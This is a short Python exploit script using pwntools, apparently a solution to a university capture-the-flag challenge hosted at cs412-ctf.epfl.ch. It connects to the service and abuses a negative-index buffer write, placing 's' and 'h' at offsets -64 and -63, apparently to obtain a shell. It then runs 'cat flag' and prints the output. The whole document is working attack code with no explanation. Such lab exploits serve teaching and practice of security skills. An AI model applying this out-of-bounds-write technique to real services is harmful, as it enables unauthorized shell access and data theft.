from pwn import *

p=remote("cs412-ctf.epfl.ch", 11001)
p.recvuntil("Which position do you want to write into the buffer, and what do you want to write?")
p.sendline("-64 s")
p.recvuntil("Which position do you want to write into the buffer, and what do you want to write?")
p.sendline("-63 h")
p.sendline("cat flag")
flag = p.recvline()
print(flag.decode("utf-8"))
